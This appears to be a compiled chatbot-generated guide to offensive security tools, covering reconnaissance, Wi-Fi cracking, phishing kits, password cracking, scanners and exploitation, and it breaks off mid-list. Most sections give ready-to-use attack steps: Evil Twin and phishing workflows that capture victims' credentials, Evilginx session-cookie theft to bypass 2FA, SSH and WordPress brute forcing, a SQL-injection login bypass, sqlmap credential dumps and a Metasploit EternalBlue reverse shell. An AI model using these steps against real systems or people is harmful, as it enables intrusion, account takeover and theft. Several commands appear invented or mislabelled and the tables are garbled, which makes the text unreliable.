Information Gathering in Cybersecurity 
Information gathering (also called reconnaissance) is the first phase of an attack or 
penetration test. It involves collecting as much information as possible about the target, 
such as domain names, IP addresses, open ports, services, technologies, employees, and 
email addresses. 
Here’s a deep dive into some of the most widely used tools in information gathering, 
along with their descriptions, parameters, usage examples, and advanced techniques. 
1. Nmap (Network Mapper) 
Nmap is one of the most powerful network scanning tools. It helps in discovering hosts, 
identifying open ports, detecting services, and mapping networks. 
Key Features 
• Port Scanning: Finds open ports on a target. 
• Service Version Detection: Identifies running services and their versions. 
• OS Detection: Detects the operating system of a target. 
• Vulnerability Detection: Uses scripts (NSE - Nmap Scripting Engine) to find 
vulnerabilities. 
Common Nmap Parameters 
Parameter -sS 
Description 
Stealth SYN scan (avoids detection) -sV -O -A -p -Pn -T4 
Service version detection 
OS detection 
Aggressive mode (includes OS, version, and 
traceroute) 
Specify port range (e.g., -p 1-65535) 
Disables ping check (useful for firewalled hosts) 
Faster scan (T0-T5, where T5 is fastest) --script Run NSE scripts for vulnerabilities 
Usage Examples 
1. Basic Scan: 
bash 
CopyEdit 
nmap -sS 192.168.1.1 
2. Scan a Range of IPs: 
bash 
CopyEdit 
nmap -p 22,80,443 192.168.1.1-50 
3. Aggressive Scan with OS Detection: 
bash 
CopyEdit 
nmap -A -T4 scanme.nmap.org 
4. Run Vulnerability Scripts: 
bash 
CopyEdit 
nmap --script=vuln 192.168.1.1 
2. Shodan 
Shodan is a search engine for internet-connected devices. It allows searching for IoT 
devices, cameras, databases, and exposed services. 
Key Features 
• Finds exposed databases (MongoDB, Elasticsearch, MySQL). 
• Searches for default credentials on network devices. 
• Scans for open ports and services across the internet. 
• Identifies vulnerable servers based on banners. 
Usage 
• Website: https://www.shodan.io 
• API Access: Requires an API key. 
Shodan Search Examples 
1. Find Open RDP Servers: 
makefile 
CopyEdit 
port:3389 
2. Find Exposed MongoDB Databases: 
makefile 
CopyEdit 
product:MongoDB 
3. Find Cisco Devices: 
vbnet 
CopyEdit 
title:"Cisco Router" 
4. Find IoT Cameras: 
arduino 
CopyEdit 
"webcam" port:80 
Shodan CLI Commands 
bash 
CopyEdit 
shodan search "port:21 country:IN" 
3. Maltego 
Maltego is a powerful OSINT tool used for data visualization and relationship mapping. 
Key Features 
• Maps connections between domains, emails, IPs, social media profiles, and 
organizations. 
• Extracts data from whois records, DNS, and social media. 
• Used in law enforcement, cyber investigations, and threat intelligence. 
Usage 
1. Install Maltego from https://www.maltego.com. 
2. Use transforms to gather OSINT data. 
3. Connect it with APIs like Shodan, Censys, or Have I Been Pwned. 
4. TheHarvester 
TheHarvester is an OSINT tool for gathering emails, subdomains, hosts, and employee 
names. 
Key Features 
• Collects data from Google, Bing, LinkedIn, and Shodan. 
• Gathers email addresses from public sources. 
• Finds subdomains linked to an organization. 
Usage 
bash 
CopyEdit 
theharvester -d example.com -b google 
Parameters 
Parameter -d 
Description 
Target domain -b -l 
Example 
bash 
CopyEdit 
Data source (Google, Bing, Shodan, 
etc.) 
Limit results 
theharvester -d target.com -b all 
5. Recon-ng 
Recon-ng is a powerful framework for automated OSINT collection. 
Key Features 
• Automates Google dorks, Whois lookups, and API-based reconnaissance. 
• Uses modules to collect emails, subdomains, and metadata. 
Usage 
bash 
CopyEdit 
recon-ng 
bash 
CopyEdit 
modules search domains-hosts 
use domains-hosts/bing 
set SOURCE example.com 
run 
6. Amass 
Amass is a subdomain enumeration tool used for passive and active reconnaissance. 
Key Features 
• Finds subdomains and IP addresses. 
• Uses search engines, APIs, and brute force techniques. 
Usage 
bash 
CopyEdit 
amass enum -d example.com 
7. Censys 
Censys is another search engine like Shodan but focuses on SSL certificates, domains, 
and services. 
Usage 
• Website: https://search.censys.io 
• CLI Example: 
bash 
CopyEdit 
censys search "443.https.tls.certificate.parsed.subject_dn: 
example.com" 
8. OSINT Framework 
OSINT Framework is a collection of tools and resources for information gathering. 
Usage 
• Website: https://osintframework.com 
• It includes links to various OSINT tools. 
9. Gobuster 
Gobuster is a fast web directory and subdomain brute-force tool. 
Key Features 
• Finds hidden directories and files. 
• Performs subdomain brute force. 
Usage 
bash 
CopyEdit 
gobuster dir -u http://example.com -w 
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
Parameters 
Parameter Descriptio
 n -u -w 
Target URL 
Wordlist 
Example 
bash 
CopyEdit 
gobuster dns -d example.com -w subdomains.txt 
Final Thoughts 
Each of these tools plays a critical role in penetration testing and cybersecurity 
research. Combining these tools can maximize reconnaissance efforts and uncover 
hidden details about a target. 
Do you want an advanced attack scenario combining these tools?         
Wireless Hacking & Penetration Testing 
Wireless hacking focuses on assessing and exploiting vulnerabilities in Wi-Fi networks. 
Attackers use various tools to capture packets, crack encryption keys, and perform 
attacks on wireless networks. 
Here’s a deep dive into some of the best Wi-Fi hacking tools, including descriptions, 
commands, attack techniques, and real-world usage. 
1. Aircrack-NG 
Aircrack-NG is the most popular Wi-Fi penetration testing toolset used for cracking WEP, 
WPA, and WPA2 encryption. 
Key Features 
Captures and analyzes wireless packets 
Cracks WEP, WPA, WPA2 encryption using dictionary or brute force attacks 
Deauthenticates clients from the network 
Can inject packets into the network 
Basic Commands & Usage 
1. Scan for Wireless Networks 
bash 
CopyEdit 
airmon-ng start wlan0 
airodump-ng wlan0mon 
2. Capture Handshake (for WPA/WPA2 cracking) 
bash 
CopyEdit 
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon 
3. Deauthenticate a Client to Capture a Handshake 
bash 
CopyEdit 
aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF 
wlan0mon 
4. Crack WPA/WPA2 Password 
bash 
CopyEdit 
aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 handshake.cap 
Advanced Attack: Use GPU-powered hashcat to speed up cracking: 
bash 
CopyEdit 
hashcat -m 22000 handshake.hccapx rockyou.txt --force 
2. Wifite 
Wifite is an automated Wi-Fi attack tool that simplifies penetration testing by running 
multiple attacks on a network. 
Key Features 
Automates WEP, WPA, WPA2, and WPS attacks 
Deauthenticates clients and captures WPA handshakes 
Brute forces WPS PINs (Reaver integration) 
Supports Aircrack-NG, Reaver, and PixieWPS 
Usage 
bash 
CopyEdit 
wifite --wpa 
• --wpa: Attack only WPA/WPA2 networks 
• --wep: Attack only WEP networks 
• --wps: Attack WPS-enabled networks 
Example: Fully Automated Attack 
bash 
CopyEdit 
wifite --wpa --handshake-check 
3. Kismet 
Kismet is a wireless network detector, packet sniffer, and intrusion detection system 
(IDS). 
Key Features 
Detects hidden SSIDs 
Identifies rogue access points 
Works in monitor mode for passive sniffing 
Captures Wi-Fi packets for analysis 
Usage 
bash 
CopyEdit 
kismet -c wlan0mon 
Detect Hidden Wi-Fi Networks 
bash 
CopyEdit 
kismet -c wlan0mon --hide-ssid 
4. TCPDump 
TCPDump is a lightweight network packet analyzer that captures packets from interfaces. 
Key Features 
Captures and analyzes network packets 
Filters packets by IP, port, or protocol 
Supports real-time packet analysis 
Usage 
Capture All Wireless Traffic 
bash 
CopyEdit 
tcpdump -i wlan0mon -n 
Filter Traffic by IP 
bash 
CopyEdit 
tcpdump -i wlan0mon src 192.168.1.1 
Capture Only DNS Traffic 
bash 
CopyEdit 
tcpdump -i wlan0mon port 53 
Save Packets to a File for Analysis 
bash 
CopyEdit 
tcpdump -i wlan0mon -w capture.pcap 
5. AirSnort 
AirSnort is a WEP encryption key cracking tool. 
Key Features 
Passively listens to packets to crack WEP keys 
Works on weak WEP networks 
Recovers encryption keys automatically 
Usage 
bash 
CopyEdit 
airsnort -i wlan0mon 
Note: WEP is highly insecure and deprecated; modern networks use WPA/WPA2. 
6. NetStumbler 
NetStumbler is a Windows-based tool for detecting Wi-Fi networks. 
Key Features 
Detects Wi-Fi signals, SSIDs, and signal strength 
Used for wardriving (mapping networks while moving) 
Identifies interference and weak signals 
Usage 
1. Download NetStumbler from https://www.netstumbler.com. 
2. Open the app and start scanning for available Wi-Fi networks. 
7. Reaver 
Reaver is a brute-force attack tool that exploits WPS vulnerabilities to recover the 
WPA/WPA2 passphrase. 
Key Features 
Attacks WPS-enabled routers 
Retrieves the Wi-Fi password without a dictionary attack 
Works with PixieWPS for offline attacks 
Usage 
Scan for WPS-Enabled Networks 
bash 
CopyEdit 
wash -i wlan0mon 
Run Reaver Attack 
bash 
CopyEdit 
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv 
Run PixieWPS Attack 
bash 
CopyEdit 
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1 
PixieWPS is an offline attack that exploits weak WPS implementations. 
Advanced Wireless Attacks 
Here are some real-world attack scenarios using these tools: 
1. WPA2 Handshake Cracking 
1. Capture WPA handshake with airodump-ng 
2. Deauthenticate a client with aireplay-ng 
3. Crack the handshake using aircrack-ng or hashcat 
2. WPS PIN Brute-Forcing (WPS Attack) 
1. Scan for WPS-enabled routers using wash 
2. Attack using reaver -i wlan0mon -b [BSSID] -vv 
3. Hidden SSID Discovery 
1. Use airodump-ng to monitor packets 
2. Deauth clients using aireplay-ng 
3. Capture and reveal the hidden SSID in packet logs 
4. Evil Twin Attack (Fake Access Point) 
1. Set up a fake access point using airbase-ng 
2. Deauth clients from the real network 
3. Capture credentials using a phishing page 
Final Thoughts 
These tools play a crucial role in penetration testing and red teaming. Mastering them 
allows you to:    
Identify vulnerabilities in Wi-Fi networks 
Perform ethical hacking & security testing 
Prevent real-world cyber attacks 
Next Steps: Want an advanced wireless attack scenario or a detailed step-by-step 
guide for real-world Wi-Fi penetration testing? Let me know!         
Social Engineering & Phishing Tools 
Social engineering is one of the most effective attack vectors in cybersecurity. It exploits 
human psychology rather than technical vulnerabilities. Phishing, a key social engineering 
technique, tricks users into revealing credentials, financial data, or personal 
information. 
Here’s a deep dive into the most powerful phishing & social engineering tools, including 
descriptions, commands, attack techniques, and real-world examples. 
1. GoPhish 
GoPhish is an open-source phishing framework used to create, launch, and manage 
phishing campaigns. 
Key Features 
Automates phishing email campaigns 
Tracks who opened emails & clicked links 
Generates fake login pages 
Provides detailed reports & analytics 
Installation 
bash 
CopyEdit 
wget https://getgophish.com/releases/gophish-v0.12-linux-64bit.zip 
unzip gophish-v0.12-linux-64bit.zip 
cd gophish 
./gophish 
Usage 
1. Access the Admin Panel: https://localhost:3333 
2. Create a New Email Template 
3. Set Up a Phishing Landing Page 
4. Launch a Campaign 
5. Analyze Click Rates & Credential Harvesting 
2. HiddenEye 
HiddenEye is a modern phishing tool that generates fake login pages for popular 
websites. 
Key Features 
Creates realistic phishing pages 
Supports Facebook, Instagram, Twitter, Google, PayPal, etc. 
Captures victim credentials in real-time 
Generates custom phishing links 
Installation 
bash 
CopyEdit 
git clone https://github.com/DarkSecDevelopers/HiddenEye 
cd HiddenEye 
python3 HiddenEye.py 
Usage 
1. Select a Target Website (e.g., Facebook, Instagram) 
2. Generate a Fake Login Page 
3. Send the Phishing Link to the Target 
4. Capture Credentials in the Console 
3. SocialFish 
SocialFish is a phishing attack framework that uses fake login pages to steal credentials. 
Key Features 
Clones legitimate login pages 
Supports Facebook, Instagram, Twitter, and more 
Uses Ngrok for link hosting 
Logs usernames & passwords in real-time 
Installation 
bash 
CopyEdit 
git clone https://github.com/UndeadSec/SocialFish.git 
cd SocialFish 
pip3 install -r requirements.txt 
python3 SocialFish.py 
Usage 
1. Choose a Target (e.g., Facebook, Google, PayPal) 
2. Generate a Phishing Link 
3. Send the Link to the Victim 
4. Capture Login Credentials 
4. EvilURL 
EvilURL is a homograph attack tool that generates look-alike domains to trick users. 
Key Features 
Generates fake domains using Unicode characters 
Exploits Punycode vulnerabilities 
Creates domains like gοοgle.com instead of google.com 
Works for phishing & typo-squatting attacks 
Installation 
bash 
CopyEdit 
git clone https://github.com/UndeadSec/EvilURL.git 
cd EvilURL 
python3 evilurl.py 
Usage 
1. Enter a Legitimate Domain 
2. Generate a Fake Look-Alike Domain 
3. Register the Domain & Set Up a Phishing Site 
Example 
• Legitimate URL: paypal.com 
• Fake Phishing URL: paypaI.com (uses a capital i instead of l) 
5. Evilginx 
Evilginx is an advanced phishing framework that bypasses 2FA (Two-Factor 
Authentication) using man-in-the-middle (MITM) attacks. 
Key Features 
Captures session tokens & cookies 
Bypasses 2FA authentication 
Creates realistic phishing pages 
Supports Facebook, Google, Microsoft, Instagram, etc. 
Installation 
bash 
CopyEdit 
git clone https://github.com/kgretzky/evilginx2.git 
cd evilginx2 
./install.sh 
evilginx 
Usage 
1. Set Up Evilginx Proxy 
bash 
CopyEdit 
config domain evilginx.example.com 
2. Create a Phishing Site 
bash 
CopyEdit 
phishlets enable facebook 
3. Send the Link to the Target 
4. Capture Credentials & Session Cookies 
Example Attack: 
• The victim logs into evilginx-facebook.com. 
• Evilginx steals the session cookie. 
• The attacker can bypass 2FA and log in as the victim. 
Advanced Phishing Attacks 
1. Clone a Banking Website & Steal Logins 
• Use SocialFish or HiddenEye to generate a realistic fake banking login page. 
• Send the phishing link via email or SMS. 
• Capture login credentials. 
2. Create a Malicious URL Using EvilURL 
• Generate a fake Google login page with gοοgle.com. 
• Register the domain and create a legitimate-looking SSL certificate. 
• Send the fake login page to victims. 
3. Bypass 2FA with Evilginx 
• Target users with a Google or Microsoft phishing page. 
• Capture session tokens and login cookies. 
• Log in without needing 2FA. 
Defensive Measures (How to Prevent Phishing Attacks) 
Enable U2F (Universal 2nd Factor) – Instead of SMS-based 2FA, use hardware 
security keys like YubiKey. 
Check URLs Carefully – Look for typosquatting attacks (gοοgle.com vs. 
google.com). 
Use Browser Extensions – Install Netcraft Anti-Phishing and Google Safe Browsing. 
Enable Email Filtering – Block phishing emails with DMARC, SPF, and DKIM. 
Use Password Managers – They prevent users from entering credentials on fake 
sites. 
Final Thoughts 
These tools are widely used in penetration testing, red teaming, and cybersecurity 
research. Understanding how attackers use them allows security professionals to detect, 
prevent, and mitigate phishing attacks. 
Want a complete guide on advanced social engineering attacks or real-world 
phishing scenarios? Let me know!         
Password Cracking & Hash Breaking 
Password cracking is an essential skill in cybersecurity, used for penetration testing, 
forensic investigations, and security auditing. Attackers use various tools to crack 
hashed passwords, bypass authentication, and gain unauthorized access. 
Here’s a deep dive into the best password-cracking tools, covering descriptions, 
techniques, commands, attack methodologies, and real-world examples. 
1. John The Ripper (JTR) 
John the Ripper (JTR) is a fast and powerful password cracker supporting various hash 
formats like MD5, SHA1, NTLM, and bcrypt. 
Key Features 
Supports wordlist-based & brute-force attacks 
Cracks Linux, Windows, and web hashes 
Optimized for CPU-based cracking 
Can be used for offline attacks 
Installation 
bash 
CopyEdit 
sudo apt update 
sudo apt install john 
Usage 
1. Crack a Simple Password Hash 
bash 
CopyEdit 
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
2. Crack a Windows NTLM Hash 
bash 
CopyEdit 
john --format=NT hash.txt 
3. Perform a Brute-Force Attack 
bash 
CopyEdit 
john --incremental hash.txt 
Example Attack 
1. Extract hashes from /etc/shadow 
bash 
CopyEdit 
unshadow /etc/passwd /etc/shadow > hash.txt 
2. Crack them using John the Ripper 
bash 
CopyEdit 
john hash.txt 
2. Hydra (THC-Hydra) 
Hydra is a fast online password-cracking tool used for brute-forcing remote services 
like SSH, FTP, HTTP, and RDP. 
Key Features 
Supports SSH, FTP, HTTP, RDP, SMTP, MySQL, PostgreSQL, and more 
Multithreaded for faster attacks 
Can bypass account lockouts with timed delays 
Installation 
bash 
CopyEdit 
sudo apt update 
sudo apt install hydra 
Usage 
1. Brute-force an SSH Login 
bash 
CopyEdit 
hydra -l admin -P passwords.txt ssh://192.168.1.100 
2. Brute-force an FTP Server 
bash 
CopyEdit 
hydra -l user -P rockyou.txt ftp://192.168.1.100 
3. Crack a Web Login Page (HTTP-POST FORM) 
bash 
CopyEdit 
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form 
"/login.php:user=^USER^&pass=^PASS^:Invalid credentials" 
Example Attack: 
• Target a WordPress Admin Panel: 
bash 
CopyEdit 
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/wp
login.php:log=^USER^&pwd=^PASS^:Invalid username" 
3. Hashcat 
Hashcat is the most powerful password recovery tool, optimized for GPU acceleration, 
making it much faster than CPU-based tools. 
Key Features 
Supports over 300 hash algorithms (MD5, SHA1, SHA256, NTLM, bcrypt, etc.) 
Uses CPU, GPU, and FPGA acceleration 
Supports brute-force, dictionary, rule-based, and mask attacks 
Cracks Wi-Fi handshakes, Windows hashes, and more 
Installation 
bash 
CopyEdit 
sudo apt install hashcat 
Usage 
1. Crack a MD5 Hash 
bash 
CopyEdit 
hashcat -m 0 -a 0 hash.txt wordlist.txt 
2. Crack NTLM Hash 
bash 
CopyEdit 
hashcat -m 1000 -a 0 hash.txt rockyou.txt 
3. Perform a Mask Attack 
bash 
CopyEdit 
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a 
(Tries all 5-character passwords) 
4. Crack a WPA2 Wi-Fi Handshake 
bash 
CopyEdit 
hashcat -m 22000 handshake.hccapx wordlist.txt 
Example Attack 
• Capture a Wi-Fi handshake using aircrack-ng, then crack it using hashcat. 
4. Ophcrack 
Ophcrack is a Windows password-cracking tool that uses Rainbow Tables for fast 
LM/NTLM hash cracking. 
Key Features 
Cracks Windows 7, 10, and 11 passwords 
Uses precomputed Rainbow Tables for fast results 
Works without needing the original password file 
Usage 
1. Boot from the Ophcrack Live CD 
2. Load the Windows SAM file (C:\Windows\System32\config\SAM) 
3. Start the password recovery process 
Example Attack: 
• Use Ophcrack Live CD to recover Windows Admin passwords in minutes. 
5. Medusa 
Medusa is an online password brute-forcing tool, similar to Hydra but faster and more 
scalable. 
Key Features 
Supports multi-threading for high-speed attacks 
Works on SSH, FTP, HTTP, MySQL, RDP, and more 
Handles multiple targets simultaneously 
Usage 
1. Crack an SSH Server 
bash 
CopyEdit 
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh 
2. Crack a MySQL Database 
bash 
CopyEdit 
medusa -h 192.168.1.100 -u root -P wordlist.txt -M mysql 
6. Cain & Abel 
Cain & Abel is a Windows-based password-cracking tool used for network sniffing, 
hash cracking, and password recovery. 
Key Features 
Cracks Windows passwords 
Performs MITM & ARP spoofing 
Decrypts network traffic 
Recovers saved passwords from browsers 
Usage 
1. Run Cain & Abel as Administrator 
2. Load Hashes from Windows SAM File 
3. Crack Passwords using Dictionary or Brute-Force Attack 
Example Attack: 
• Intercept network traffic and steal unencrypted credentials. 
7. THC-Hydra (Alternative to Hydra) 
THC-Hydra is an advanced parallelized password cracker that supports network login 
attacks. 
Key Features 
Cracks remote authentication services 
Supports dictionary & brute-force attacks 
Works with SSH, FTP, SMTP, HTTP, RDP, etc. 
Usage 
bash 
CopyEdit 
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh 
(Tries all combinations of usernames and passwords) 
Real-World Attacks & Techniques 
1. Cracking Linux Passwords 
• Extract /etc/shadow hashes 
• Crack using John the Ripper 
bash 
CopyEdit 
unshadow /etc/passwd /etc/shadow > hash.txt 
john hash.txt 
2. Cracking Windows Passwords 
• Extract NTLM hashes from SAM file 
• Crack using Ophcrack or Hashcat 
bash 
CopyEdit 
hashcat -m 1000 hashes.txt rockyou.txt 
3. Brute-Force SSH Login 
bash 
CopyEdit 
hydra -l root -P wordlist.txt ssh://192.168.1.100 
Defensive Measures (How to Protect Against Cracking) 
Use Strong Passwords (16+ characters, mix of letters, numbers, and symbols) 
Enable Multi-Factor Authentication (MFA) 
Limit Login Attempts & Enable Account Lockout 
Use Password Hashing Algorithms (bcrypt, scrypt, Argon2) 
Monitor Login Attempts for brute-force detection 
Final Thoughts 
These tools are essential for ethical hacking, penetration testing, and red teaming. 
Understanding how passwords are cracked helps security professionals implement 
strong defenses. 
Want a complete guide on advanced password-cracking attacks? Let me know!         
Vulnerability Scanning Tools 
Vulnerability scanning is a critical phase in penetration testing where automated tools 
identify security flaws in systems, applications, and networks. These tools help red 
teams, blue teams, and SOC analysts find vulnerabilities before attackers do. 
Here’s an in-depth guide on the top vulnerability scanners, including installation, usage, 
scanning techniques, and real-world examples. 
1. OpenVAS (Open Vulnerability Assessment System) 
OpenVAS is an open-source vulnerability scanner that identifies security weaknesses in 
networks, servers, and web applications. 
Key Features 
Over 50,000+ vulnerability tests (CVEs, misconfigurations, outdated software) 
Detects unpatched software, weak passwords, and misconfigurations 
Supports scheduled scans & detailed reports 
Scans internal and external networks 
Installation (Kali Linux) 
bash 
CopyEdit 
sudo apt update 
sudo apt install openvas 
sudo gvm-setup 
sudo gvm-start 
• Access Web UI at https://127.0.0.1:9392 
Usage 
1. Create a New Target (e.g., 192.168.1.100) 
2. Start a Full Vulnerability Scan 
3. Analyze Reported CVEs & Risk Levels 
Example Attack: 
• Scan a company’s network for exposed services & outdated software: 
bash 
CopyEdit 
gvm-cli --gmp-username admin --gmp-password admin --xml 
"<create_target>192.168.1.100</create_target>" 
2. Nessus 
Nessus is a powerful commercial vulnerability scanner developed by Tenable, used for 
compliance auditing and security assessments. 
Key Features 
Detects malware, misconfigurations, and missing patches 
Scans databases, web applications, cloud environments 
Supports CVE scanning, CIS benchmarks, and PCI DSS compliance 
Offers pre-built policies for AWS, Azure, and Docker 
Installation (Linux) 
bash 
CopyEdit 
curl -o Nessus-10.0.0-ubuntu.deb 
https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads
 /16529/download 
sudo dpkg -i Nessus-10.0.0-ubuntu.deb 
sudo systemctl start nessusd 
• Access Web UI at https://localhost:8834 
Usage 
1. Launch a New Scan (e.g., “Basic Network Scan”) 
2. Set Target as 192.168.1.1/24 
3. Review Results & Remediate Vulnerabilities 
Example Attack: 
• Scan a web server for outdated software & unpatched vulnerabilities: 
bash 
CopyEdit 
nessuscli scan list 
nessuscli scan run --policy “Web Application Scan” --target 
192.168.1.100 
3. IBM AppScan (HCL AppScan) 
IBM AppScan (now HCL AppScan) is a web application security scanner that identifies 
XSS, SQL Injection, and OWASP Top 10 vulnerabilities. 
Key Features 
Detects injection attacks (SQLi, XSS, Command Injection, SSRF) 
Performs static (SAST) and dynamic (DAST) scanning 
Supports manual and automated testing 
Integrates with CI/CD pipelines (Jenkins, GitLab, Azure DevOps) 
Installation 
• Windows/Linux: Download from HCL AppScan 
• Cloud Version Available 
Usage 
1. Set the Target Web Application (https://example.com) 
2. Perform a Full Dynamic Scan 
3. Identify & Mitigate Vulnerabilities 
Example Attack: 
• Scan a website for SQL Injection vulnerabilities: 
bash 
CopyEdit 
appscan.sh -d https://example.com -o scan-results.xml 
4. Lynis 
Lynis is an open-source security auditing tool for Linux, Unix, and macOS systems. 
Key Features 
Scans system security, file permissions, network settings 
Detects rootkits, insecure SSH settings, firewall issues 
Helps in compliance auditing (PCI DSS, HIPAA, ISO 27001) 
Works on local and remote systems 
Installation 
bash 
CopyEdit 
sudo apt update 
sudo apt install lynis 
Usage 
1. Run a Full System Security Audit 
bash 
CopyEdit 
sudo lynis audit system 
2. Check for Security Misconfigurations 
bash 
CopyEdit 
sudo lynis show details security 
Example Attack: 
• Identify weak SSH configurations: 
bash 
CopyEdit 
sudo lynis audit system | grep SSH 
5. Retina Network Security Scanner 
Retina (by BeyondTrust) is a network vulnerability scanner that detects network, cloud, 
and IoT security issues. 
Key Features 
Detects open ports, weak passwords, and vulnerable software 
Supports Active Directory auditing 
Identifies exploitable CVEs 
Provides patch recommendations 
Installation 
• Available for Windows Server & Enterprise Environments 
Usage 
1. Set up Retina Web Console 
2. Add Network Ranges 
3. Start Scanning & Generate Risk Reports 
Example Attack: 
• Scan for unpatched Windows servers and missing security updates. 
6. Nexpose (by Rapid7) 
Nexpose (by Rapid7, the creators of Metasploit) is a real-time vulnerability scanner that 
detects network and web security flaws. 
Key Features 
Scans endpoints, databases, web servers, and cloud environments 
Detects misconfigurations, outdated software, and missing patches 
Provides risk scores based on exploitability 
Supports integration with Metasploit for exploitation 
Installation 
bash 
CopyEdit 
curl -O https://download2.rapid7.com/download/NexposeSetup-Linux64.bin 
chmod +x NexposeSetup-Linux64.bin 
sudo ./NexposeSetup-Linux64.bin 
Usage 
1. Set Up Nexpose Web Console (https://localhost:3780) 
2. Add a Network Range (192.168.1.0/24) 
3. Launch an Advanced Vulnerability Scan 
Example Attack: 
• Scan network devices for vulnerabilities: 
bash 
CopyEdit 
nexpose scan start --target 192.168.1.100 
Real-World Attack Scenarios & Techniques 
1. Find Vulnerable Web Apps with Nessus 
• Scan for SQL Injection & XSS vulnerabilities: 
bash 
CopyEdit 
nessuscli scan run --policy “Web App Scan” --target https://target.com 
2. Exploit Weak SSH Configurations with Lynis 
• Scan for root login permissions & outdated ciphers: 
bash 
CopyEdit 
sudo lynis audit system | grep SSH 
3. Scan IoT Devices for Weak Passwords with Retina 
• Find default credentials in IoT devices: 
bash 
CopyEdit 
retina scan -ip 192.168.1.1/24 
4. Use Nexpose + Metasploit for Exploitation 
• Identify exploitable CVEs & launch attacks using Metasploit. 
Defensive Measures (How to Protect Against Scanning) 
Regularly Patch & Update Software 
Disable Unused Services & Close Open Ports 
Use Firewalls to Block Unauthorized Scanners 
Enable Intrusion Detection Systems (IDS/IPS) 
Perform Internal Security Audits 
Final Thoughts 
These tools are critical for identifying security risks before attackers do. Ethical 
hackers, SOC analysts, and cybersecurity engineers use them to harden networks, web 
apps, and cloud environments. 
Want a step-by-step guide on real-world vulnerability assessments? Let me know! 
Exploitation Tools & Frameworks in Cybersecurity 
Exploitation is the phase of penetration testing where vulnerabilities discovered during 
reconnaissance and scanning are actively exploited to gain unauthorized access, 
escalate privileges, or extract sensitive data. 
Here’s a deep dive into the top exploitation tools, their usage, commands, 
and real-world attack scenarios. 
1. Burp Suite (Web Exploitation & Interception) 
Burp Suite is a web security testing tool that allows attackers to intercept, modify, and 
exploit HTTP/S traffic. 
Key Features 
Intercept & Modify HTTP Requests 
Automated Scanning (Burp Scanner) for SQLi, XSS, CSRF 
Intruder (Brute Force & Parameter Tampering) 
Repeater (Manual Payload Testing) 
Extensible with Burp Extensions (e.g., Turbo Intruder, Logger++) 
Installation (Kali Linux) 
bash 
CopyEdit 
sudo apt update 
sudo apt install burpsuite 
Usage 
1. Start Burp Suite & Configure Browser Proxy (127.0.0.1:8080) 
2. Intercept & Modify HTTP Requests 
3. Use Intruder for Brute Force Attacks 
4. Scan for SQL Injection & XSS Vulnerabilities 
Example Attack: SQL Injection in Login Page 
1. Intercept Login Request 
2. Modify Username Parameter to: 
sql 
CopyEdit 
' OR '1'='1' -- 
3. Forward Request & Gain Access 
2. Metasploit Framework (MSF) (Exploitation Framework) 
Metasploit is the most powerful penetration testing framework, providing pre-built 
exploits, payloads, and post-exploitation modules. 
Key Features 
Over 2000+ Exploits & Payloads 
Post-Exploitation (Privilege Escalation, Pivoting) 
Brute-Force & Exploit Automation 
Shellcode & Payload Generator (msfvenom) 
Installation (Kali Linux) 
bash 
CopyEdit 
sudo apt update 
sudo apt install metasploit-framework 
Usage 
1. Scan Target with Nmap 
bash 
CopyEdit 
nmap -p 445 --script vuln 192.168.1.100 
2. Start Metasploit 
bash 
CopyEdit 
msfconsole 
3. Search & Use an Exploit 
bash 
CopyEdit 
search ms08_067 
use exploit/windows/smb/ms08_067_netapi 
set RHOSTS 192.168.1.100 
set PAYLOAD windows/meterpreter/reverse_tcp 
exploit 
Example Attack: Exploiting Windows SMB with EternalBlue 
bash 
CopyEdit 
use exploit/windows/smb/ms17_010_eternalblue 
set RHOST 192.168.1.105 
set LHOST 192.168.1.200 
exploit 
Success: Get a reverse shell on the victim machine. 
3. SQLMap (Automated SQL Injection) 
SQLMap is a powerful SQL Injection tool that automates database exploitation. 
Key Features 
Detects & Exploits SQL Injection 
Extracts Databases, Tables, and Credentials 
Bypasses WAF (Web Application Firewall) 
Supports All Databases (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) 
Installation (Kali Linux) 
bash 
CopyEdit 
sudo apt update 
sudo apt install sqlmap 
Usage 
1. Scan a Target Website for SQL Injection 
bash 
CopyEdit 
sqlmap -u "http://target.com/index.php?id=1" --dbs 
2. Extract Database Tables 
bash 
CopyEdit 
sqlmap -u "http://target.com/index.php?id=1" -D users --tables 
3. Dump User Credentials 
bash 
CopyEdit 
sqlmap -u "http://target.com/index.php?id=1" -D users -T credentials --dump 
Example Attack: Extracting Admin Credentials 
bash 
CopyEdit 
sqlmap -u "http://target.com/login.php?user=admin" --dump 
Success: Dumps the admin’s hashed password. 
4. ZAP (Zed Attack Proxy) (Web Vulnerability Scanner) 
OWASP ZAP is a powerful open-source web security scanner used for automated and 
manual penetration testing. 
Key Features 
Automated Scanning for OWASP Top 10 Issues 
Intercept & Modify HTTP Requests 
Spidering & Fuzzing 
WebSockets Testing 
Installation (Kali Linux) 
bash 
CopyEdit 
sudo apt install zaproxy 
Usage 
1. Run ZAP Proxy 
bash 
CopyEdit 
zap.sh 
2. Scan a Web Application 
bash 
CopyEdit 
zap-cli quick-scan http://target.com 
Example Attack: Detecting XSS 
• Scan for Reflected & Stored XSS vulnerabilities: 
bash 
CopyEdit 
zap-cli active-scan http://target.com --xss 
5. ExploitDB (Exploit Database) 
ExploitDB is an online repository of public exploits, used for research and real-world 
attacks. 
Key Features 
Searchable Database of Exploits 
Local CLI Tool (searchsploit) 
Pre-compiled Exploits for Metasploit 
Installation (Kali Linux) 
bash 
CopyEdit 
sudo apt install exploitdb 
Usage 
1. Search for Vulnerabilities 
bash 
CopyEdit 
searchsploit Windows 10 
2. View Exploit Details 
bash 
CopyEdit 
searchsploit -x 47288 
6. Core Impact (Enterprise Exploitation Tool) 
Core Impact is a commercial penetration testing framework used for advanced 
exploitation and pivoting. 
Key Features 
Automated Exploits for Windows, Linux, IoT 
Advanced Pivoting & Lateral Movement 
